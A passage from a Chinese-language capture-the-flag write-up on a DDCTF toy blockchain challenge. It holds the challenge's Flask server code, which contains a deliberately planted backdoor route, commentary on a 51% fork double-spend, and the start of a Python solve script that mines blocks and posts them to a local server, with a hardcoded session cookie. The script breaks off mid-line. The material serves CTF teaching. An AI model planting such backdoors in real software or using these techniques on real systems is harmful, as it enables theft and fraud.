utxos[input_utxo_id]</span><br><span class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</span><br><span class="line">    <span class="keyword">return</span> utxos</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></span><br><span class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</span><br><span class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></span><br><span class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</span><br><span class="line">    <span class="keyword">return</span> balance</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></span><br><span class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</span><br><span class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</span><br><span class="line">    new_utxo_ids = set()</span><br><span class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</span><br><span class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</span><br><span class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</span><br><span class="line">        tot_input = <span class="number">0</span></span><br><span class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</span><br><span class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</span><br><span class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</span><br><span class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</span><br><span class="line">            utxo = utxos[utxo_id]</span><br><span class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</span><br><span class="line">            tot_input += utxo[<span class="string">'amount'</span>]</span><br><span class="line">            <span class="keyword">del</span> utxos[utxo_id]</span><br><span class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</span><br><span class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    </span><br><span class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</span><br><span class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</span><br><span class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</span><br><span class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</span><br><span class="line">    session.modified = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></span><br><span class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</span><br><span class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></span><br><span class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</span><br><span class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</span><br><span class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></span><br><span class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</span><br><span class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</span><br><span class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</span><br><span class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</span><br><span class="line">        append_block(second_block)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></span><br><span class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</span><br><span class="line">        append_block(third_block)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    tail = find_blockchain_tail()</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line">    announcement = <span class="string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span></span><br><span class="line">    balance, utxos, _ = get_balance_of_all()</span><br><span class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</span><br><span class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</span><br><span class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</span><br><span class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</span><br><span class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> announcement+(<span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></span><br><span class="line">    collected = []</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</span><br><span class="line">            amount -= utxo[<span class="string">'amount'</span>]</span><br><span class="line">            collected.append(utxo[<span class="string">'id'</span>])</span><br><span class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></span><br><span class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</span><br><span class="line">    outputs = [create_output_utxo(addr_to, amount)]</span><br><span class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</span><br><span class="line">        outputs.append(create_output_utxo(addr_from, the_change))</span><br><span class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        address = str(address)</span><br><span class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></span><br><span class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</span><br><span class="line"></span><br><span class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</span><br><span class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        block = json.loads(request.data)</span><br><span class="line">        append_block(block, DIFFICULTY)</span><br><span class="line">        msg = <span class="string">'transaction finished.'</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">        </span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</span><br><span class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></span><br><span class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        msg += <span class="string">' You receive a diamond.'</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></span><br><span class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">    source.close()</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>题目给的区块链是有三个区块，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 创世块银行1000000个币</span><br><span class="line">2. 黑客转走999999个币，给银行留下1个币</span><br><span class="line">3. 再有一个空的区块</span><br></pre></td></tr></table></figure><p><img src="/img/ddctf/1524447858.png" alt=""></p><p>然后让你买2个钻石。</p><p><img src="/img/ddctf/1524448043.png" alt=""></p><p>OK，只要往商店的地址转钱，当该地址有1000000个币时，会给你一个钻石。注意到，这个钻石是储存在<code>session[&#39;your_diamonds&#39;]</code> 中。</p><p>然后，添加一个区块，记录将商店中的币转走到冷钱包中。</p><p>这里的主要问题在于，只有你在挖矿，即你可以控制全网算力（100%&gt;51%），所以你可以在任何地方进行分叉，否认之后所有的交易（否认一条，后面的都不成立的）。</p><p><img src="/img/ddctf/1524447577.png" alt=""></p><p>对了，这里还有个后门，当然，可用可不用</p><p><img src="/img/ddctf/1524448911.png" alt=""></p><p>分析下做法</p><h4 id="利用后门"><a href="#利用后门" class="headerlink" title="利用后门"></a>利用后门</h4><p><img src="/img/ddctf/1524458373.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> btc</span><br><span class="line"><span class="keyword">import</span> rsa, uuid, json, copy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">txout_id = str(uuid.uuid4())</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">url_prefix = <span class="string">"http://localhost:5000/b9af31f66147e"</span></span><br><span class="line">ss = requests.session()</span><br><span class="line">ss.cookies.set(<span class="string">"session"</span>,<span class="string">".eJzNVtuOm0gU_JWVn-cBGvCYSHmwF4yw0o2w2ybdURRxM9CAZzT2BLuj-fctnE1WGa_ysNqs1iOLy-BzqapThy-TrHvI2-PkzZeJXVhklhalmZF9XpSFOzNSZzorZ7lNSiM3nH3mGoa5n7r394W7n-5LYrolscneSqczwxlj1OmxHo-_ZZM3ExbEmqq6lsH2LNSqF2TdSa-1aeCbTNVdFFCD9ttB6Lkp-9Ch3vwslXCYLtooEUT22wvlXUdVfJGK1UxVA4vfvp283E3qsqnq0-SNcTc5PBzy8nvSXVB34XL9mCU7HXpz_c54rLNmdkFwJ_TZg0gcJZPzMbPCKiN2JQ6rx6w_4lxUOdmpjDhtGKzqNDl_Lt7Hlezdy3iNZ66JH5_Kz9-TIejwr3_nXzs8PaWHY5qfmocD6Plwgy0FhrEe8Yq8VSv60JReeGaKWtSLbeYJOwr8QSTUlHx-obrF9dZhaqFwX1OyAy_rJuLUFMBYJqymf2LbHB6fAe2Hj3eTh-fT1_Mvk7Qonr6nj_iuoQGSJ8se1IGeykFKU4A6hOqQFoi3juhXLQtC0BgbDGVFQajxTM10PDAeapqwRirfll6Hez6RfN2AZoOhHcp9O_IQl8dogTqCQC68RS5fj2Wm_cPzAbWZxvVz9yNAomcNgHBYInFc9ADAkNwnTFca1VhStSaE6VC1UlLF9ig-ZBhYsm4kr8wIX8rnDtWxZoCLKTHIbwAVf_HghSZCOkJVJ0ZCEv1uGFFC9TveQr_iRPVCid63RbJWjFf25OUFsB6b6pCenp_KEeWXjwjpZnvDyY29k6XWdEoc23Hv9_k0S2dmapV56dozgv-XRe6Y2axMzXvLcrKpm6VpZs6IezN8UbLqqbdTNAArva9R_2VEMuJFL7RsBK_OgoMpAlF41YUldJDXIpdNFOxqynNN9Q5sdA1YbiivLtGr4SOvh09sFl32fmGUm0WTBa5Kh7e3QyN0bAnAI5KVosofMOrmtSJUifMzRr4RxLcpWcIuYAEaLAQhAUtnoaGDXtaRN7ehEWhi1bAEco7_dmhGZHP7PnWnaZYT03D3DjAFxO7eNN0sT2dWWhYOsQzXyKZ728wtEJHOjNk0c_Msc1LLvEH2V9b_DVnzNbIbfxnGm6HabBYLvllsN_62ittltLksIm7m9Q3Kv9J8f25N1MvR63ZgwbqWSvaUb4FXfKZe3WL-YTeYOG9OqCowea3FlIQHACu-qKFQKwpwJ_DP8A0Dv9PwhoZWP1rTP56-n3malw8MXTMiiNDrDqiBJx8uMCLpXyTvcN2aSDpQvmqoEmdG4GtaYlp8B51aVMOzOL3IQIB3f5B8O8A74JHCEAroeznseVEDdUeq3BZ6NfZsMt7-4Gnu9fPK0qSX2zBAQpEAxojxrAyqV42EoCggp4lsKVn1ABUFbAFcAfPd2lJ1aKbumDc3Wb-EJaz7UXxM152sbixNerKPPEy-J07X48aA74bnd4lvIPRJjusDvk2vvj8fLe3u_7weXqFIg2UXcTzNsR1VV4-1Ic5FqC1yAyW1bqmqNJ7QjFOgB9l6kKNuUTO2bo-FgN9RHdqip0bEIfJbFAXkKJMxJIUMfS0hTYQgkKZJR7lyYVOonnm5CYKa28XwDcsgHKS3bDBOwHLXj4soCpY181hLOaQFo5cwcqZD2A9MXFUYNyhCC9QXnyWoY96iixIowYMZgA_Bl1iIW1MoOWJNmOej2wKLEmbAYWMexpXg7SDYDpgZ_KG5qjyUx-b46frG-Ok_e9O7PDw_fSoa0Hko4DbGyx8gEXQk.Db7w9Q.hqEXHtLsqopnbFpfz5UTfgca8LM"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = ss.get(url=url_prefix+<span class="string">"/"</span>,proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#工作量证明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(b, difficulty, msg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> nonce&lt;(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        b[<span class="string">'nonce'</span>] = msg+str(nonce)</span><br><span class="line">        b[<span class="string">'hash'</span>] = btc.hash_block(b)</span><br><span class="line">        block_hash = int(b[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> block_hash &lt; difficulty:</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        nonce+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构造一个空块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">empty_block</span><span class="params">(msg, prevHash)</span>:</span></span><br><span class="line">    b=&#123;&#125;</span><br><span class="line">    b[<span class="string">"prev"</span>] = prevHash</span><br><span class="line">    b[<span class="string">"transactions"</span>] = []</span><br><span class="line">    b = pow(b, btc.DIFFICULTY, msg)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprint</span><span class="params">(b)</span>:</span></span><br><span class="line">    print(json.dumps(b))</span><br><span class="line">    print(len(json.dumps(b)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_server</span><span class="params">(b)</span>:</span></span><br><span class="line">    data = json.dumps(b)</span><br><span class="line">    r = ss.post(url = url_prefix+<span class="string">"/create_transaction"</span>,data = data, headers = &#123;<span class="string">"content-type"</span>:<span class="string">"application/json"</span>&#125;,proxies = proxies)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">()</span>:</span></span><br><span class="line">    r = ss.get(url = url_prefix+<span class="string">"/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_address, proxies = proxies)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">shop_address = <span 